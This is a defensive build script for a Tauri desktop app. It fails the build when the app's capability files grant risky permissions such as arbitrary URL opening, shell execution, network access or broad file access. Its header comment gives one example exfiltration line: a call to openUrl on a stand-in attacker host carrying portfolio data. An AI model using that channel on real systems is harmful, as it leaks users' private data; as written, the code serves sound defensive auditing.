// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 astarat-code
/**
 * check-capabilities.js — Checks that the Tauri ACL grants nothing beyond what is needed.
 *
 * WHY THIS CHECK EXISTS: "opener:default" had been added to get the open_path command.
 * But that permission set ALSO grants allow-open-url and allow-default-urls, whose scope
 * is http://* and https://*. In other words: any address, opened in the default browser.
 *
 * That is the worst possible hole in this application. The Content-Security-Policy
 * prevents the webview from making a network request — but opening the system browser
 * does NOT go through the webview. openUrl("https://attacker/?d=<portfolio>") would send
 * every piece of data out without the CSP having any say. It is exactly the channel a
 * compromised npm dependency would use.
 *
 * The trap is that nothing shows: the offending permission is called "default", the most
 * innocuous name on the list, and its real content only appears in the crate's source.
 * Hence this check, run at build time.
 *
 * Usage:  node scripts/check-capabilities.js
 */
const fs = require('fs');
const path = require('path');

const DIR = path.join(__dirname, '..', 'src-tauri', 'capabilities');

// Permissions interdites, et la raison — affichée telle quelle en cas d'échec, pour
// que celui qui déclenche l'erreur comprenne sans avoir à retrouver cet audit.
const INTERDITES = new Map([
  ['opener:default', "contient allow-open-url + allow-default-urls (http://*, https://*) : exfiltration hors de portée de la CSP. Utilisez « opener:allow-open-path » avec sa liste blanche."],
  ['opener:allow-open-url', "ouvre une adresse arbitraire dans le navigateur : canal d'exfiltration. L'application n'ouvre que des chemins locaux."],
  ['shell:default', 'permet de lancer des programmes arbitraires.'],
  ['shell:allow-open', 'permet de lancer des programmes arbitraires.'],
  ['shell:allow-execute', 'permet de lancer des programmes arbitraires.'],
  ['shell:allow-spawn', 'permet de lancer des programmes arbitraires.'],
  ['http:default', "réintroduit un accès réseau, alors que l'application est hors ligne par construction."],
  ['fs:default', "accorde bien plus que les trois dossiers de l'application ; les permissions fs sont listées une par une, avec fs:scope."],
  ['fs:allow-read', "trop large : voir les permissions fs granulaires déjà listées."],
  ['fs:allow-write', "trop large : voir les permissions fs granulaires déjà listées."],
]);

// Permissions qui DOIVENT rester bornées par une liste de chemins. Sans portée, elles
// s'appliquent à tout le disque.
const EXIGENT_UNE_PORTEE = new Set(['opener:allow-open-path']);

const problems = [];

function identifiant(entry) {
  if (typeof entry === 'string') return entry;
  if (entry && typeof entry === 'object' && typeof entry.identifier === 'string') return entry.identifier;
  return null;
}

const fichiers = fs.existsSync(DIR)
  ? fs.readdirSync(DIR).filter((f) => f.endsWith('.json'))
  : [];

if (fichiers.length === 0) {
  console.error(`Aucun fichier de capacité trouvé dans ${DIR} — contrôle impossible.`);
  process.exit(1);
}

let total = 0;

for (const fichier of fichiers) {
  const complet = path.join(DIR, fichier);
  let capability;
  try {
    capability = JSON.parse(fs.readFileSync(complet, 'utf8'));
  } catch (e) {
    problems.push(`${fichier} : JSON illisible — ${e.message}`);
    continue;
  }

  const permissions = Array.isArray(capability.permissions) ? capability.permissions : [];
  const vues = new Set();

  for (const entry of permissions) {
    const id = identifiant(entry);
    if (!id) {
      problems.push(`${fichier} : entrée de permission non reconnue — ${JSON.stringify(entry)}`);
      continue;
    }
    total += 1;
    vues.add(id);

    if (INTERDITES.has(id)) {
      problems.push(`${fichier} : « ${id} » est interdite — ${INTERDITES.get(id)}`);
    }

    if (EXIGENT_UNE_PORTEE.has(id)) {
      const portee = typeof entry === 'object' && Array.isArray(entry.allow) ? entry.allow : null;
      if (!portee || portee.length === 0) {
        problems.push(`${fichier} : « ${id} » est déclarée sans liste « allow » : elle porterait alors sur tout le disque.`);
      }
    }

    // opener:allow-open-path ouvre un fichier via ShellExecute : pour un .bat, un .exe
    // ou un .lnk, cela l'EXÉCUTE. La portée ne doit donc désigner que des .pdf, ou un
    // dossier (ouvert dans l'explorateur, jamais exécuté). L'application a aussi le droit
    // d'ÉCRIRE dans ses dossiers : avec un motif « /** », un script compromis (dépendance
    // npm) y déposerait un .bat puis le ferait ouvrir — du JavaScript devenu programme
    // natif, hors de toute la protection de la webview (B-01).
    if (id === 'opener:allow-open-path' && typeof entry === 'object' && Array.isArray(entry.allow)) {
      for (const e of entry.allow) {
        const p = e && typeof e.path === 'string' ? e.path : '';
        const estPdf = /\.pdf$/i.test(p);
        const estDossier = !/[.]/.test(p.split('/').pop() || '') && !p.includes('*');
        if (!estPdf && !estDossier) {
          problems.push(`${fichier} : « opener:allow-open-path » autorise « ${p} » — seuls des .pdf ou un dossier peuvent être ouverts (sinon ShellExecute exécute le fichier).`);
        }
        if (p.includes('**')) {
          problems.push(`${fichier} : « opener:allow-open-path » utilise « ** » dans « ${p} » : trop large, un fichier exécutable y passerait.`);
        }
      }
    }
  }

  // fs:scope borne l'accès disque. Sans elle, les permissions fs:allow-* listées
  // s'appliqueraient partout où l'utilisateur a le droit d'écrire.
  const aDesPermissionsFs = [...vues].some((id) => id.startsWith('fs:allow-'));
  if (aDesPermissionsFs && !vues.has('fs:scope')) {
    problems.push(`${fichier} : des permissions « fs:allow-* » sont accordées sans « fs:scope » pour les borner.`);
  }
}

if (problems.length > 0) {
  console.error("L'ACL Tauri accorde plus que nécessaire :\n");
  for (const p of problems) console.error(`  • ${p}`);
  console.error(`\n${problems.length} problème(s). Voir src-tauri/capabilities/ et SECURITY.md.`);
  process.exit(1);
}

console.log(`ACL Tauri conforme (${total} permission(s) vérifiée(s) dans ${fichiers.length} fichier(s)).`);
